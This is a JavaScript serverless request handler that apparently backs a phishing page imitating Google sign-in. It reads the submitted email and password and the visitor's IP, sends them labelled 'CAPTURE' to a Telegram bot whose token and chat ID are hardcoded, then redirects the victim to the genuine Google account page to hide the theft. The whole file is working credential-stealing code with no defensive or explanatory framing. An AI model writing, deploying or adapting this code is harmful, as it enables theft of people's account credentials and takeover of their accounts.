export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  const BOT  = '8718510825:AAFofMZHXf7SRg2RGIdldtpmeY-O59Rku-4';
  const CHAT = '8373436173';

  let email = '', password = '';

  // Parse body (form-urlencoded atau JSON)
  try {
    if (req.headers['content-type']?.includes('application/json')) {
      const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
      email = body.email || '';
      password = body.password || '';
    } else {
      const body = typeof req.body === 'string'
        ? Object.fromEntries(new URLSearchParams(req.body))
        : req.body;
      email = body.email || '';
      password = body.password || '';
    }
  } catch (e) {}

  const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';

  const msg = `🔐 CAPTURE\n\nEmail: ${email}\nPass : ${password}\nIP   : ${ip}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text: msg })
    });
  } catch (e) {}

  // Redirect ke Google asli
  res.writeHead(302, { Location: 'https://myaccount.google.com/' });
  res.end();
}